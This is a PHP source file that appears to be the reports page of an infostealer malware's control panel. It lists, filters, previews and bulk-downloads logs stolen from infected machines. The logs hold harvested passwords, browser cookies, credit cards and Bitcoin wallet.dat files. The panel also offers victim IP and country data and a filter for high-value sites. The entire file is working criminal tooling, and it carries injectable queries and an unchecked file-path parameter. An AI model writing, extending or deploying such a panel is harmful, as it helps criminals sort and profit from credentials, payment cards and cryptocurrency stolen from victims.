<?php
require_once('common.php');
require_once('global.php');

$conn = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME);

if (isset($_POST['action']) && isset($_POST['rep_id']) && is_numeric($_POST['rep_id']))
{
    $rep_id = $_POST['rep_id'];
    if ($_POST['action'] == 'addComment') {
        $query = sprintf("UPDATE reports SET reports.comment='%s' WHERE reports.rep_id=%d",
            mysqli_real_escape_string($conn, $_POST['comment']), $rep_id);
        mysqlExecute($query);
        die();
    }
    else if ($_POST['action'] == 'setChecked') {
        $query = sprintf("UPDATE reports SET reports.checked=%s WHERE reports.rep_id=%d",
            mysqli_real_escape_string($conn, $_POST['checked']), $rep_id);
        mysqlExecute($query);
        die();
    }
	else if ($_POST['action'] == 'toggleFavourite') {
		$favourite = !mysqlQuery('SELECT favourite FROM `reports` WHERE rep_id='.$rep_id)[0]['favourite'];
		$query = sprintf("UPDATE `reports` SET reports.favourite=%d WHERE reports.rep_id=%d", $favourite, $rep_id);
		mysqlExecute($query);
		echo ($favourite ? 'Unmark favourite' : 'Mark favourite');
		die();
	}
    else if ($_POST['action'] == 'deleteLog')
    {
        $rep_data = mysqlQuery('SELECT guid, zipname FROM `reports` WHERE rep_id='.$rep_id)[0];
        $screen = 'screenshots/'.$rep_id.'-'.$rep_data['guid'].'.png';
        $archive = 'files/'.$rep_data['zipname'];
        mysqlExecute('DELETE FROM `reports` WHERE rep_id='.$rep_id);
        mysqlExecute('DELETE FROM `passwords` WHERE report_id='.$rep_id);
        mysqlExecute('DELETE FROM `cookies` WHERE report_id='.$rep_id);
        mysqlExecute('DELETE FROM `credit_cards` WHERE rep_id='.$rep_id);
        @unlink($archive);
        @unlink($screen);
        exit();
    }
	else if ($_POST['action'] === 'showImpLinks')
	{
		$query = sprintf('SELECT DISTINCT host FROM `passwords` WHERE report_id=%d AND (1=0 ', $_POST['rep_id']);
		$links = explode("\r\n", file_get_contents('config/links.txt'));
		foreach ($links as $key => $value) {
			$query .= " OR LOCATE('".mysqli_real_escape_string($conn, $value)."', host)";
		}
		$query .= ')';
		$results = mysqlQuery($query);
		for ($i = 0; $i < count($results); ++$i) echo $results[$i]['host']."<br>";
		die();
	}
	else if ($_POST['action'] === 'showExtraInfo')
	{
		$output = '';
		$query = sprintf('SELECT zipname, ip FROM `reports` WHERE rep_id=%d', $_POST['rep_id']);
		$result = mysqlQuery($query)[0];
		$zippath = 'files/'.$result['zipname'];
		$zip = new ZipArchive();
		if ($zip->open($zippath))
		{
			for ($i = 0; $i < $zip->numFiles; ++$i)
			{
				$stat = $zip->statIndex($i);
				if (strstr($stat['name'], '/Bitcoin/wallet.dat'))
				{
					echo sprintf("Bitcoin(%s):<br>", $stat['name']);
					$stream = $zip->getStream($stat['name']);
					$content = stream_get_contents($stream, $stat['size']);
					echo getBtcAddrInfo($content).'<br><br>';
				}
			}
			$zip->close();
		}
		echo getStateZipByIp($result['ip']);
		die();
	}
	else if ($_POST['action'] === 'getLogPreview')
	{
		$zipname = mysqlQuery('SELECT zipname FROM `reports` WHERE rep_id='.$_POST['rep_id'])[0]['zipname'];
		$zippath = 'files/'.$zipname;
		$zip = new ZipArchive();
		if ($zip->open($zippath))
		{
			for($i = 0; $i < $zip->numFiles; ++$i)
			{
				$stat = $zip->statIndex( $i );

				$html_data = sprintf("<tr class='open-file-button' onclick='%s' data-file='%s'><td>%s</td><td>%s</td></tr>",
					sprintf('window.open("reports.php?action=getLogFile&rep_id=%d&file=%s", "_blank")', $rep_id, $stat['name']),
					$stat['name'], $stat['name'], human_filesize($stat['size']));
				echo $html_data;
			}
			$zip->close();
		}
		die();
	}
}

else if (isset($_GET['action']) && isset($_GET['rep_id']) && is_numeric($_GET['rep_id']))
{
	if ($_GET['action'] == 'getLogFile' && isset($_GET['file']))
	{
		$file = $_GET['file'];
		$zippath = 'files/'.mysqlQuery('SELECT zipname FROM `reports` WHERE rep_id='.$_GET['rep_id'])[0]['zipname'];
		if (strstr($file, '.png'))
		{
			$z = new ZipArchive();
			if ($z->open($zippath)) {
				$stat = $z->statName($file);
				$fp   = $z->getStream($file);
				if ($fp)
				{
					header('Content-Type: image/jpeg');
					header('Content-Length: ' . $stat['size']);
					fpassthru($fp);
				}
				$z->close();
			}
		}
		else if (strstr($file, '.txt') || strstr($file, '.log'))
		{
			header('Content-Type: text/html; charset=utf-8');
			$zip = new ZipArchive;
			if ($zip->open($zippath))
			{
				echo nl2br($zip->getFromName($file));
				$zip->close();
			}
		}
		else
		{
			$zip = new ZipArchive;
			if ($zip->open($zippath))
			{
				$stat = $zip->statName($file);
				$fp = $zip->getStream($file);
				if ($fp)
				{
					header('Content-Type: application/octet-stream');
					header('Content-Disposition: attachment; filename="'.basename($file).'"');
					header('Expires: 0');
					header('Pragma: no-cache');
					header('Content-Length: ' . $stat['size']);
					fpassthru($fp);
				}
				$zip->close();
			}
		}
		die();
	}
}

?>

<!DOCTYPE html>
<html>
	<head>
		<link rel="shortcut icon" type="image/png" href="img/favicon.png">
		<link rel="stylesheet" href="css/jquery.fancybox.min.css" />
        <script src="js/functions.js"></script>
		<script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
		<script src="js/jquery.fancybox.min.js"></script>
	</head>

	<body>
         <script>

			 function selectAll() {
				 var checkboxes = document.getElementsByName('selection');
				 for (var i = 0; i < checkboxes.length; ++i) checkboxes[i].checked = true;
			 }

			 function deleteSelected() {
				 var checkboxes = document.getElementsByName('selection');
				 for (var i = checkboxes.length - 1; i >= 0; --i) {
					 if (checkboxes[i].checked) {
						 var report_id = checkboxes[i].value;
						 makePost('action=deleteLog&rep_id=' + report_id);
						 delRow(checkboxes[i]);
					 }
				 }
			 }

        </script>

		<?php $type = "reports"; include("nav_bar.php"); ?>

		<div class="main-info">
            <form method="get" name="filterform">
                    <p class="content-subheading">Date From: <input class="edit" type="date" name="datefrom" /></p>
				    <p class="content-subheading">Date To: <input class="edit" type="date" name="dateto" /></p>
                    <p class="content-subheading">OS:
					    <select name="osversion" class="content-dropdown">
                            <option></option>
						    <option value="1">XP (Server 2003 R2)</option>
						    <option value="2">VISTA (Server 2008)</option>
						    <option value="3">WIN7 (Server 2008 R2)</option>
                            <option value="4">WIN8 (Server 2012)</option>
                            <option value="5">WIN8.1 (Server 2012 R2)</option>
                            <option value="6">WIN10 (Server 2016)</option>
					    </select>
                    </p>
				    <p class="content-subheading">Integrity Level:
					    <select name="il_index" class="content-dropdown">
						    <option></option>
						    <option value="2">medium</option>
                            <option value="3">high</option>
                            <option value="4">system</option>
					    </select>
                    </p>
                    <p class="content-subheading">Checked:
                        <select name="checked_index" class="content-dropdown">
                            <option>All</option>
                            <option value="1">Checked only</option>
                            <option value="0">Not checked only</option>
                        </select>
                    </p>
                    <p class="content-subheading">Favourite: <input type="checkbox" class="content-checkbox" name="is_favourite" /></p>
                    <p class="content-subheading">With BTC: <input type="checkbox" class="content-checkbox" name="with_btc" /></p>
                    <p class="content-subheading">With CC: <input type="checkbox" class="content-checkbox" name="with_cc" /></p>
                    <p class="content-subheading">With Important Links: <input type="checkbox" class="content-checkbox" name="with_imp_links" /></p>
                    <p class="content-subheading">Countries: <input class="edit" name="countries"/></p>
					<p class="content-subheading">Comment: <input class="edit" name="comment" /></p>
                    <p class="content-subheading">Include cookie host: <input class="edit" name="cookiehost" /></p>

                    <button type="submit" class="example_a" style="margin-left: 0;"><i class="fas fa-filter" style="margin-right: 5px;"></i> Filter</button>
                </form>
                    <div style="margin: 25px 0 5px 10px;">
						<button class="button-inline" onclick="selectAll()">
							<i class="fas fa-check" style="margin-right: 10px;"></i>
							Select all
						</button>
						<button class="button-inline" onclick="location.href = 'reports.php?action=downloadAll';">
							<i class="fas fa-download" style="margin-right: 10px;"></i>
							Download All
						</button>
						<button class="button-inline" onclick="if (confirm('Are you sure?')) window.location.href = 'reports.php?action=deleteDummies';">
							<i class="fas fa-trash" style="margin-right: 10px;"></i>
							Delete Dummies
						</button>
						<button class="button-inline" onclick="if (confirm('Are you sure?')) deleteSelected();">
							<i class="fas fa-trash"></i>
							Delete selected
						</button>
						<button class="button-inline" onclick="if (confirm('Are you sure?')) window.location.href = 'reports.php?action=deleteAll';">
							<i class="fas fa-trash"></i>
							Delete All
						</button>
					</div>
            <br />
			<?php
				$query = 'SELECT rep_id, guid, timestamp, checked, ip, country_code, country, os_name, pcname, username, admin, il, pwd_count, btc_count, cc_count, files_count, comment, zipname, favourite FROM `reports` ';
                if (isset($_GET['cookiehost']) && !empty($_GET['cookiehost'])) $query .= 'JOIN cookies ON reports.rep_id = cookies.report_id ';
                if (isset($_GET['with_imp_links'])) $query .= 'JOIN passwords ON reports.rep_id = passwords.report_id ';
                $query .= ' WHERE 1=1 ';
                if (isset($_GET['datefrom']) && !empty($_GET['datefrom'])) {
                    $date = date_create_from_format('Y-m-d', $_GET['datefrom']);
                    $timestamp = date_timestamp_get($date);
                    $timestamp -= ($timestamp % 86400);
                    $query .= ' AND reports.timestamp >= '.$timestamp;
                }
                if (isset($_GET['dateto']) && !empty($_GET['dateto'])) {
                    if ($date = date_create_from_format('Y-m-d', $_GET['dateto'])) {
                        $timestamp = date_timestamp_get($date);
                        $timestamp += (86400 - ($timestamp % 86400));
                        $query .= ' AND reports.timestamp <='.$timestamp;
                    }
                }
                if (isset($_GET['cookiehost']) && !empty($_GET['cookiehost']))
				{
					$host = explode(':', $_GET['cookiehost'])[0];
					$query .= " AND LOCATE('".mysqli_real_escape_string($conn, $host)."', cookies.host)";
				}
                if (isset($_GET['countries']) && !empty($_GET['countries'])) $query .= " AND LOCATE(reports.country_code, '".mysqli_real_escape_string($conn, $_GET['countries'])."') ";
				if (isset($_GET['comment']) && !empty($_GET['comment'])) $query .= " AND LOCATE('".mysqli_real_escape_string($conn, $_GET['comment'])."', reports.comment) ";
                if (isset($_GET['checked_index']) && is_numeric($_GET['checked_index'])) $query .= ' AND reports.checked='.$_GET['checked_index'];
				if (isset($_GET['is_favourite']) && $_GET['is_favourite'] == 'on') $query .= ' AND reports.favourite = 1';
                //if (isset($_GET['is_admin']) && $_GET['is_admin'] === 'on') $query .= ' AND reports.is_admin = 1';
                if (isset($_GET['with_btc']) && $_GET['with_btc'] === 'on') $query .= ' AND reports.btc_count > 0';
                if (isset($_GET['with_cc']) && $_GET['with_cc'] === 'on') $query .= ' AND reports.cc_count > 0';
                if (isset($_GET['osversion']) && is_numeric($_GET['osversion'])) {
                    $baseVer = $_GET['osversion'] * 2;
                    $query .= sprintf(' AND os_version IN (%d, %d) ', $baseVer, $baseVer - 1);
                }
                if (isset($_GET['il_index']) && is_numeric($_GET['il_index'])) $query .= ' AND reports.il = '.$_GET['il_index'];
                if (isset($_GET['with_imp_links']) && $_GET['with_imp_links'] === 'on') {
                    $query .= ' AND (1=0';
                    $links = explode("\r\n", file_get_contents('config/links.txt'));
                    foreach ($links as $key => $value) {
                        $query .= " OR LOCATE('".mysqli_real_escape_string($conn, $value)."', passwords.host)";
                    }
                    $query .= ')';
                }
				$query .= ' GROUP BY reports.rep_id ORDER BY reports.rep_id DESC';
				if (isset($_GET['cookiehost']) && !empty($_GET['cookiehost']))
				{
					$min_count = explode(':', $_GET['cookiehost']);
					if (count($min_count) == 2 && is_numeric($min_count[1])) $query .= sprintf(' HAVING SUM(cookies.count) >= %d', $min_count[1]);
				}
                $results = mysqlQuery($query);
				echo sprintf("<p class='content-subheading'>Logs count: %d</p>", count($results));
			?>

			<script type="text/javascript">
				if (location.search)
				{
					var data = location.search.substring(1).split('&');
					var pairs = {};
					for (var i = 0; i < data.length; ++i)
					{
						var parameter = data[i].split('=');
						pairs[parameter[0]] = parameter[1];
    				}
					var form = document.filterform;
					for (var i in pairs) if (form.elements[i])
					{
						form.elements[i].value = decodeURIParam(pairs[i]);
						if (form.elements[i].type == 'checkbox' && pairs[i] == 'on') form.elements[i].checked = true;
					}
				}
			</script>

			<table class="darkTable">
				<thead>
					<tr>
						<th scope="col"></th>
                        <th scope="col">ID</th>
						<th scope="col">GUID</th>
						<th scope="col">IP</th>
                        <th scope="col">Country</th>
						<th scope="col">OS</th>
                        <!-- <th scope="col">PC(User)</th> -->
						<!-- <th scope="col">Admin</th> -->
						<th scope="col">IL</th>
                        <th scope="col">PWD | BTC | CC | Files</th>
                        <th scope="col">Comment</th>
                        <th scope="col">Checked</th>
                        <th scope="col">Log Date</th>
						<th scope="col"></th>
					</tr>
				</thead>

				<tbody id="main_items">
                    <?php

                    if (isset($_GET['action']))
					{
						if ($_GET['action'] == 'downloadAll') {
							if (count($results) == 0)
							{
								header('Location: reports.php');
								die();
							}
							set_time_limit(0);
							if (ob_get_level()) ob_end_clean();
							ignore_user_abort(true);
                            $zipname = tempnam("tmp", "zip");
							$zip = new ZipArchive;
							$zip->open($zipname, ZipArchive::CREATE);
							for ($i = 0; $i < count($results); ++$i) {
								$file = $results[$i]['zipname'];
								$zip->addFile('files/'.$file, $file);
							}
							$zip->close();
                            header('Content-Type: application/octet-stream');
                            header('Content-Disposition: attachment; filename="logs.zip"');
                            header('Expires: 0');
                            header('Pragma: no-cache');
                            header('Content-Length: ' . filesize($zipname));
                            flush();
                            readfile($zipname);
							unlink($zipname);
							die();
						}
						else if ($_GET['action'] == 'deleteAll')
						{
							mysqlExecute('TRUNCATE TABLE `reports`');
							mysqlExecute('TRUNCATE TABLE `passwords`');
							mysqlExecute('TRUNCATE TABLE `cookies`');
                            mysqlExecute('TRUNCATE TABLE `passwords`');
							foreach (glob('files/*.zip') as $zip) unlink($zip);
							foreach (glob('screenshots/*.png') as $screen) unlink($screen);
							header('Location: reports.php');
							die();
						}
						else if ($_GET['action'] == 'deleteDummies')
						{
							$reports = mysqlQuery('SELECT rep_id, guid, zipname FROM `reports` WHERE (pwd_count = 0 AND btc_count = 0 AND cc_count = 0 AND files_count = 0)');
							for ($i = 0; $i < count($reports); ++$i)
							{
                                $rep_id = $reports[$i]['rep_id'];
								$screen = 'screenshots/'.$rep_id.'-'.$reports[$i]['guid'].'.png';
								$archive = 'files/'.$reports[$i]['zipname'];
                                mysqlExecute('DELETE FROM `reports` WHERE rep_id='.$rep_id);
                                mysqlExecute('DELETE FROM `passwords` WHERE report_id='.$rep_id);
                                mysqlExecute('DELETE FROM `cookies` WHERE report_id='.$rep_id);
                                mysqlExecute('DELETE FROM `credit_cards` WHERE rep_id='.$rep_id);
								@unlink($archive);
								@unlink($screen);
							}
                            header('Location: reports.php');
							die();
						}
					}

                    for ($i = 0; $i < count($results); ++$i) printBot($results[$i]);
                    mysqli_close($conn);
                    ?>
				</tbody>
			</table>
		</div>

		<div class="modal-window" id="implinks-preview" style="display: none;">
			<p data-selectable="true" id="implinks_data"></p>
		</div>

		<div class="modal-window" id="extrainfo-preview" style="display: none;">
			<p data-selectable="true" id="extrainfo_data"
		</div>

		<div class="modal-window" id="log-preview" style="display: none;">
			<h3>
				<i class="fas fa-file-archive" style="margin-right: 5px;"></i> archive.zip
			</h3>

			<table>
				<thead>
					<tr>
						<th>Filename</th>
						<th>Size</th>
					</tr>
				</thead>

				<tbody id="log_data">
				</tbody>
			</table>

			<button id="preview-download" class="modal-button">
				<i class="fas fa-download" style="margin-right: 5px;"></i> Download
			</button>
		</div>

        <script>
		window.onclick = function(event) {
			if (!event.target.matches('.dropbtn')) {
				var dropdowns = document.getElementsByClassName("dropdown-content");
				for (var i = 0; i < dropdowns.length; i++) {
					var openDropdown = dropdowns[i];
					if (openDropdown.classList.contains('show')) {
						openDropdown.classList.remove('show');
					}
				}
			}
		}
	    </script>
	</body>

</html>